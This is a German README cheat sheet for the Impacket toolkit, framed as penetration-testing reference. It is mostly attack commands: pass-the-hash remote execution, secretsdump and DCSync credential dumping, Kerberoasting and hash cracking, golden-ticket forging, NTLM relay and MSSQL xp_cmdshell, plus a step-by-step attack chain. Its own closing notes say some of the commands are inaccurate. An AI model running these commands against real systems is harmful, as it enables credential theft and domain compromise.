# 🐍 Impacket – Python-Werkzeugsammlung für AD-Angriffe

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md)

```
  ██╗███╗   ███╗██████╗  █████╗  ██████╗██╗  ██╗███████╗████████╗
  ██║████╗ ████║██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
  ██║██╔████╔██║██████╔╝███████║██║     █████╔╝ █████╗     ██║   
  ██║██║╚██╔╝██║██╔═══╝ ██╔══██║██║     ██╔═██╗ ██╔══╝     ██║   
  ██║██║ ╚═╝ ██║██║     ██║  ██║╚██████╗██║  ██╗███████╗   ██║   
  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
              Python-Werkzeugsammlung für Netzwerkprotokolle
```

<p align="center">
  <img src="https://img.shields.io/badge/Impacket-Active_Directory-red?style=for-the-badge" alt="Impacket">
  <img src="https://img.shields.io/badge/Python-blue?style=for-the-badge" alt="Python">
  <img src="https://img.shields.io/badge/Kerberos-green?style=for-the-badge" alt="Kerberos">
</p>

---

## 📋 Inhaltsverzeichnis

- [Was ist Impacket?](#-was-ist-impacket)
- [Installation](#-installation)
- [Entfernte Befehlsausführung](#-entfernte-befehlsausführung)
- [Zugangsdaten auslesen](#-zugangsdaten-auslesen)
- [Kerberos-Angriffe](#-kerberos-angriffe)
- [SMB-Angriffe](#-smb-angriffe)
- [MSSQL-Angriffe](#-mssql-angriffe)
- [LDAP-/AD-Abfragen](#-ldap-ad-abfragen)
- [Schnellübersicht](#-schnellübersicht)

---

## 🎯 Was ist Impacket?

**Impacket** ist eine Sammlung von Python-Klassen für Netzwerkprotokolle. Die Werkzeuge unterstützen insbesondere Prüfungen von Active Directory (AD), dem Verzeichnisdienst von Microsoft:

- 🎫 **Kerberos** – AS-REP-Roasting, Kerberoasting und Angriffe mit Tickets
- 💻 **Entfernte Befehlsausführung** – psexec, wmiexec, smbexec, atexec
- 🔓 **Credential Dumping** (Auslesen von Zugangsdaten) – secretsdump, DCSync
- 📁 **SMB** – Dateioperationen und Weiterleitung von Authentifizierung (Relay)
- 🗄️ **MSSQL** – Datenbankangriffe

### Wichtige Werkzeuge

| Werkzeug | Beschreibung |
|------|-------------|
| **psexec.py** | Entfernte Befehlsausführung über SMB |
| **wmiexec.py** | Entfernte Befehlsausführung über WMI |
| **secretsdump.py** | Zugangsdaten und Hashes auslesen |
| **GetNPUsers.py** | AS-REP-Roasting |
| **GetUserSPNs.py** | Kerberoasting |
| **ntlmrelayx.py** | NTLM-Relay-Angriffe |
| **smbclient.py** | SMB-Client |
| **mssqlclient.py** | MSSQL-Client |

---

## 🚀 Installation

### Kali Linux

```bash
# In Kali vorinstalliert
impacket-psexec --help

# Alternativ installieren/aktualisieren
pip3 install impacket
pip3 install impacket --upgrade
```

### Von GitHub

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install .

# Alternativ im Entwicklungsmodus installieren
pip3 install -e .
```

### Installation prüfen

```bash
# Installation prüfen
impacket-psexec --help
python3 -c "import impacket; print(impacket.__version__)"
```

---

## 💻 Entfernte Befehlsausführung

### psexec.py

```bash
# Mit Passwort
impacket-psexec domain.local/user:password@10.10.10.10

# Mit NTLM-Hash (Pass-the-Hash)
impacket-psexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Lokaler Administrator
impacket-psexec administrator:password@10.10.10.10

# Befehl ausführen
impacket-psexec domain.local/user:password@10.10.10.10 "whoami"

# Eine bestimmte Freigabe auswählen
impacket-psexec domain.local/user:password@10.10.10.10 -target-ip 10.10.10.10
```

### wmiexec.py

```bash
# Unauffälliger als psexec
impacket-wmiexec domain.local/user:password@10.10.10.10

# Mit Hash
impacket-wmiexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Befehl ausführen
impacket-wmiexec domain.local/user:password@10.10.10.10 "whoami"

# Ohne Ausgabe (still)
impacket-wmiexec domain.local/user:password@10.10.10.10 -nooutput "cmd /c calc.exe"
```

### smbexec.py

```bash
# Verwendet SMB zur Ausführung
impacket-smbexec domain.local/user:password@10.10.10.10

# Mit Hash
impacket-smbexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Freigabe angeben
impacket-smbexec domain.local/user:password@10.10.10.10 -share ADMIN$
```

### atexec.py

```bash
# Verwendet die Aufgabenplanung
impacket-atexec domain.local/user:password@10.10.10.10 "whoami"

# Mit Hash
impacket-atexec domain.local/user@10.10.10.10 -hashes :NTLMHASH "whoami"
```

### dcomexec.py

```bash
# Verwendet DCOM
impacket-dcomexec domain.local/user:password@10.10.10.10

# Verschiedene DCOM-Objekte
impacket-dcomexec domain.local/user:password@10.10.10.10 -object MMC20
impacket-dcomexec domain.local/user:password@10.10.10.10 -object ShellWindows
impacket-dcomexec domain.local/user:password@10.10.10.10 -object ShellBrowserWindow
```

---

## 🔓 Zugangsdaten auslesen

### secretsdump.py

```bash
# Daten eines entfernten Hosts auslesen
impacket-secretsdump domain.local/user:password@10.10.10.10

# Mit Hash auslesen (PtH)
impacket-secretsdump domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Daten vom Domänencontroller auslesen (DCSync)
impacket-secretsdump domain.local/admin:password@DC01.domain.local

# DCSync nur für einen bestimmten Benutzer
impacket-secretsdump -just-dc-user krbtgt domain.local/admin:password@DC01.domain.local

# Nur NTLM-Hashes (keine Kerberos-Schlüssel)
impacket-secretsdump -just-dc-ntlm domain.local/admin:password@DC01.domain.local

# Ausgabe in eine Datei schreiben
impacket-secretsdump domain.local/admin:password@10.10.10.10 -outputfile hashes
```

### DCSync-Angriff

```bash
# Vollständiger DCSync (liest die gesamte AD-Datenbank aus)
impacket-secretsdump -just-dc domain.local/admin:password@DC01.domain.local

# DCSync für einen bestimmten Benutzer
impacket-secretsdump -just-dc-user Administrator domain.local/admin:password@DC01.domain.local

# DCSync für krbtgt (für ein Golden Ticket)
impacket-secretsdump -just-dc-user krbtgt domain.local/admin:password@DC01.domain.local

# Ausgabeformat: user:RID:LM:NTLM:::
```

### Aus lokalen Dateien

```bash
# Aus NTDS.dit + SYSTEM
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# Aus SAM + SYSTEM
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Aus SECURITY + SYSTEM (LSA-Secrets)
impacket-secretsdump -security SECURITY -system SYSTEM LOCAL
```

---

## 🎫 Kerberos-Angriffe

### AS-REP Roasting (GetNPUsers.py)

```bash
# Benutzer ohne erforderliche Präauthentifizierung finden
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass

# Mit Zugangsdaten
impacket-GetNPUsers domain.local/user:password -request

# Mit angegebener DC-IP-Adresse
impacket-GetNPUsers domain.local/user:password -dc-ip 10.10.10.10 -request

# Ausgabe in eine Datei schreiben
impacket-GetNPUsers domain.local/user:password -request -outputfile asrep.txt

# Format für Hashcat
impacket-GetNPUsers domain.local/user:password -request -format hashcat

# Format für John
impacket-GetNPUsers domain.local/user:password -request -format john
```

### Kerberoasting (GetUserSPNs.py)

```bash
# Benutzer finden, deren Diensttickets sich für Kerberoasting eignen
impacket-GetUserSPNs domain.local/user:password

# TGS-Tickets anfordern
impacket-GetUserSPNs domain.local/user:password -request

# Ausgabe in eine Datei schreiben
impacket-GetUserSPNs domain.local/user:password -request -outputfile kerberoast.txt

# DC-IP-Adresse
impacket-GetUserSPNs domain.local/user:password -dc-ip 10.10.10.10 -request

# Mit Hash
impacket-GetUserSPNs domain.local/user -hashes :NTLMHASH -request
```

### Kerberos-Hashes knacken

```bash
# AS-REP (Hashcat-Modus 18200)
hashcat -m 18200 asrep.txt wordlist.txt

# TGS/Kerberoast (Hashcat-Modus 13100)
hashcat -m 13100 kerberoast.txt wordlist.txt

# Mit John
john --wordlist=wordlist.txt asrep.txt
john --wordlist=wordlist.txt kerberoast.txt
```

### getTGT.py

```bash
# TGT mit Passwort anfordern
impacket-getTGT domain.local/user:password

# TGT mit Hash anfordern
impacket-getTGT domain.local/user -hashes :NTLMHASH

# TGT mit AES-Schlüssel anfordern
impacket-getTGT domain.local/user -aesKey <AES256KEY>

# Speichert in user.ccache
# Zur Verwendung exportieren:
export KRB5CCNAME=user.ccache
```

### ticketer.py (Golden/Silver Ticket)

```bash
# Golden Ticket
impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid S-1-5-21-... -domain domain.local Administrator

# Silver Ticket
impacket-ticketer -nthash <SERVICE_NTLM_HASH> -domain-sid S-1-5-21-... -domain domain.local -spn MSSQLSvc/target.domain.local:1433 Administrator

# Ticket verwenden
export KRB5CCNAME=Administrator.ccache
impacket-psexec domain.local/Administrator@target.domain.local -k -no-pass
```

---

## 📁 SMB-Angriffe

### smbclient.py

```bash
# Mit einer Freigabe verbinden
impacket-smbclient domain.local/user:password@10.10.10.10

# Freigaben auflisten
# (innerhalb von smbclient)
shares

# Mit einer bestimmten Freigabe verbinden
use SHARE_NAME

# Dateien auflisten
ls

# Datei herunterladen
get filename

# Datei hochladen
put localfile

# Befehl ausführen
# (wenn Schreibzugriff auf eine Freigabe besteht)
```

### smbserver.py

```bash
# SMB-Server starten (zur Datenübertragung nach außen)
impacket-smbserver share /tmp/share

# Mit Authentifizierung
impacket-smbserver share /tmp/share -username user -password pass

# SMB2-Unterstützung
impacket-smbserver share /tmp/share -smb2support
```

### ntlmrelayx.py

```bash
# Einfacher Relay-Angriff
impacket-ntlmrelayx -tf targets.txt

# Authentifizierung an SMB weiterleiten
impacket-ntlmrelayx -tf targets.txt -smb2support

# Authentifizierung weiterleiten und Befehl ausführen
impacket-ntlmrelayx -tf targets.txt -c "whoami"

# SAM beim Relay-Angriff auslesen
impacket-ntlmrelayx -tf targets.txt -smb2support --sam

# Authentifizierung an LDAP weiterleiten
impacket-ntlmrelayx -t ldap://DC01.domain.local

# Mit Responder:
# 1. Responder.conf bearbeiten und SMB = Off, HTTP = Off setzen
# 2. Ausführen: responder -I eth0
# 3. Ausführen: impacket-ntlmrelayx -tf targets.txt -smb2support
```

---

<a name="-mssql-angriffe"></a>

## 🗄️ MSSQL-Angriffe

### mssqlclient.py

```bash
# Mit Windows-Authentifizierung verbinden
impacket-mssqlclient domain.local/user:password@10.10.10.10 -windows-auth

# Mit SQL-Authentifizierung verbinden
impacket-mssqlclient sa:password@10.10.10.10

# Mit Hash
impacket-mssqlclient domain.local/user@10.10.10.10 -hashes :NTLMHASH -windows-auth

# Mit einer bestimmten Datenbank verbinden
impacket-mssqlclient domain.local/user:password@10.10.10.10 -windows-auth -db master
```

### MSSQL-Befehle

```sql
-- xp_cmdshell aktivieren
enable_xp_cmdshell

-- Befehl ausführen
xp_cmdshell whoami

-- SQL-Abfrage
SELECT * FROM master.sys.databases

-- Datei lesen
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents
```

---

## 📂 LDAP-/AD-Abfragen

### GetADUsers.py

```bash
# Alle Benutzer auflisten
impacket-GetADUsers domain.local/user:password -all

# Bestimmter Domänencontroller
impacket-GetADUsers domain.local/user:password -dc-ip 10.10.10.10 -all

# Mit Hash
impacket-GetADUsers domain.local/user -hashes :NTLMHASH -all
```

### lookupsid.py

```bash
# Benutzer durch Durchprobieren von SIDs ermitteln
impacket-lookupsid domain.local/user:password@10.10.10.10

# SID-Bereich angeben
impacket-lookupsid domain.local/user:password@10.10.10.10 20000
```

### findDelegation.py

```bash
# Delegationseinstellungen finden
impacket-findDelegation domain.local/user:password -dc-ip 10.10.10.10
```

---

## 📊 Schnellübersicht

### Authentifizierungsoptionen

| Option | Beschreibung |
|--------|-------------|
| `user:password` | Authentifizierung mit Passwort |
| `-hashes :NTLM` | NTLM-Hash (Pass-the-Hash) |
| `-hashes LM:NTLM` | LM:NTLM-Hash |
| `-aesKey KEY` | AES256-Schlüssel |
| `-k -no-pass` | Kerberos mit ccache-Ticketdatei |

### Häufige Optionen

| Option | Beschreibung |
|--------|-------------|
| `-dc-ip IP` | IP-Adresse des Domänencontrollers |
| `-target-ip IP` | Ziel-IP-Adresse |
| `-debug` | Debug-Ausgabe aktivieren |

### Übersicht zur entfernten Befehlsausführung

| Werkzeug | Verfahren | Unauffälligkeit |
|------|--------|---------|
| psexec.py | SMB + Dienst | Niedrig |
| wmiexec.py | WMI | Mittel |
| smbexec.py | SMB | Niedrig |
| atexec.py | Aufgabenplanung | Hoch |
| dcomexec.py | DCOM | Mittel |

### Angriffsablauf

```bash
# 1. Benutzer ermitteln (AS-REP-Roasting)
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass

# 2. Kerberoasting
impacket-GetUserSPNs domain.local/user:password -request

# 3. Hashes knacken
hashcat -m 18200 asrep.txt rockyou.txt
hashcat -m 13100 kerberoast.txt rockyou.txt

# 4. PtH oder Passwort verwenden
impacket-psexec domain.local/admin:password@10.10.10.10

# 5. Zugangsdaten auslesen
impacket-secretsdump domain.local/admin:password@DC01

# 6. DCSync für alle Hashes
impacket-secretsdump -just-dc domain.local/admin:password@DC01
```

---

## 📚 Ressourcen

- [Impacket GitHub](https://github.com/fortra/impacket)
- [Impacket-Beispiele](https://github.com/fortra/impacket/tree/master/examples)
- [Wiki](https://github.com/fortra/impacket/wiki)

### Verwandte Cheatsheets
- [BloodHound](../../BloodHound/translations/README.de.md)
- [Mimikatz](../../Mimikatz/translations/README.de.md)
- [Hashcat](../../Hashcat/translations/README.de.md)

---

## 📝 Ergänzende Hinweise zu den Originalbeispielen

- **Version und Parameter:** Die Beispielnamen und Optionen hängen von Paket und Version ab. Das aktuelle Paket definiert kein Attribut impacket.__version__; die gezeigte Python-Prüfzeile ist daher keine verlässliche Versionsabfrage. Bei psexec legt -target-ip die Zieladresse fest, keine Freigabe. Auch -aesKey ist nicht allgemein auf AES256 beschränkt. Die Originalbefehle bleiben unverändert. [Impacket: Paketinitialisierung](https://github.com/fortra/impacket/blob/master/impacket/__init__.py), [psexec: Argumentdefinition](https://github.com/fortra/impacket/blob/master/examples/psexec.py).
- **Berechtigungen und Wirkung:** Die Ausführungs- und Dump-Beispiele setzen passende Rechte, erreichbare Dienste und eine geeignete Authentifizierung voraus. Die Unauffälligkeitswerte sind keine Messwerte oder Erfolgsgarantie; keine Ausgabe bedeutet nicht keine Spuren. DCSync mit -just-dc liest ausgewählte Geheimnisdaten wie NTLM-Hashes und Kerberos-Schlüssel, nicht die vollständige AD-Datenbank mit sämtlichen Attributen. Die abschließende Ablaufskizze erzeugt außerdem nicht automatisch alle später genannten Eingabedateien. [Impacket: secretsdump und Datenumfang](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py), [Impacket: Ausführungsbeispiel](https://github.com/fortra/impacket/blob/master/examples/psexec.py).
- **Kerberos und Formate:** Die Hashcat-Modi 18200 und 13100 gelten für die gezeigten Kerberos-Daten mit Verschlüsselungstyp 23, nicht für jedes AS-REP-/TGS-Format. Ein Silver Ticket für einen MSSQL-SPN ist kein allgemeines Ticket für SMB-/psexec-Zugriff; Dienstbindung, Schlüssel, Berechtigungen und Validierung müssen passen. Ein ccache-Dateiname allein belegt kein für den Zielaufruf gültiges Ticket. [Hashcat: Formatreferenz](https://hashcat.net/wiki/doku.php?id=example_hashes), [Microsoft: SPNs und Dienstbindung](https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names), [Impacket: ticketer](https://github.com/fortra/impacket/blob/master/examples/ticketer.py).
- **Relay und SMB:** Die Option --sam ist im geprüften aktuellen ntlmrelayx-Parser nicht definiert. Ein Relay benötigt eine tatsächlich eingehende, weiterleitbare Authentifizierung und passende Zielbedingungen; Signierung und andere Schutzmechanismen beeinflussen das Ergebnis. Schreibzugriff auf eine SMB-Freigabe allein bedeutet zudem noch keine entfernte Befehlsausführung. [Impacket: ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py), [Impacket: psexec](https://github.com/fortra/impacket/blob/master/examples/psexec.py).
- **MSSQL-Kontext:** Der als SQL markierte Block mischt T-SQL mit besonderen Befehlen der Impacket-SQL-Konsole. enable_xp_cmdshell und die gezeigte xp_cmdshell-Kurzform werden dort vom Client verarbeitet; sie sind keine allgemein unverändert ausführbare SQL-Skriptdatei. Aktivierung, Betriebssystembefehle und Dateizugriff benötigen jeweils passende Serverberechtigungen und Konfiguration. [Impacket: SQL-Konsole](https://github.com/fortra/impacket/blob/master/impacket/examples/mssqlshell.py), [Impacket: MSSQL-Client](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py).

---

<p align="center">
  <b>🐍 AD-Angriffe mit Python verstehen und prüfen!</b><br>
  <i>Impacket – eine wichtige Werkzeugsammlung für Penetrationstests</i>
</p>
